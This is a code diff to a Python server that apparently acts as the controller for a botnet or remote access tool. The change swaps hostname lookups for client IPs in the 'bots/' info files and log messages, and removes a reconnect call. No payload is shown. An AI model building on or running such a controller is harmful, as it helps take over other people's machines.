@@ -36,16 +36,9 @@ def Server():
 
     def threaded_management(sock):
         
-        infofilename = "bots/" + str(remote_hostname[0]) + ".txt"
-        print("[↻] Getting system information of " + str(remote_hostname[0]) + ".")
+        infofilename = "bots/" + cip + ".txt"
+        print("[↻] Getting system information of " + cip + ".")
         GetINFO(client, infofilename)
-        def host(ip):
-            try:
-                hostname = socket.gethostbyaddr(ip)[0]
-                return str(hostname)
-            except:
-                return "Unknown"
-            
 
         def SendData(data):
             data = data.encode()
@@ -189,12 +182,12 @@ def Server():
             try:
                 data = sock.recv(BUFFER)
                 data = data.decode()
-                print("\r\n"+str(remote_hostname[0]) + " : " + data)
+                print("\r\n"+cip + " : " + data)
             except ConnectionAbortedError as e_one:
                 print("[ERROR] "+str(e_one) + ". Exit.")
                 client.close()
                 server.close()
-                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_one)+")")
+                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e_one)+")")
                 time.sleep(1)
                 exit(True)
                 
@@ -202,16 +195,16 @@ def Server():
             except ConnectionRefusedError as e_two:
                 client.close()
                 server.close()
-                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected. ("+str(e_two)+")")
+                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected. ("+str(e_two)+")")
                 time.sleep(1)
-                ConnectionManage();
+                
                 
 
             except ConnectionResetError as e_three:
                 print("[ERROR] " + str(e_three) + ". Exit.")
                 client.close()
                 server.close()
-                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e_three)+")")
+                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e_three)+")")
                 time.sleep(1)
                 exit(True)
                 
@@ -219,7 +212,7 @@ def Server():
             except Exception as e:
                 client.close()
                 server.close()
-                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ host(addr[0]) + " Disconnected.("+str(e)+")")
+                print("[^] " +str(addr[0])+ ":" + str(addr[1]) + " "+ cip + " Disconnected.("+str(e)+")")
                 time.sleep(1)
                 exit(True)
                 
@@ -266,12 +259,9 @@ def Server():
         cip =  str(addr[0]) 
         cport = str(addr[1])
         print("[+] Connection from ", cip+":"+cport + " ( " + myip + ":" + str(myport) + " ⇆ " + cip+":"+cport + " )")
-        try:
-            remote_hostname = socket.gethostbyaddr(cip)
-        except:
-            remote_hostname = "[UNKNOWN]"
+       
         
-        print("[+] HOST " + str(remote_hostname[0]) + " has connected.")
+        print("[+] HOST " + cip + " has connected.")
         clist.append(client)
         iplist.append(addr[0])
         try:
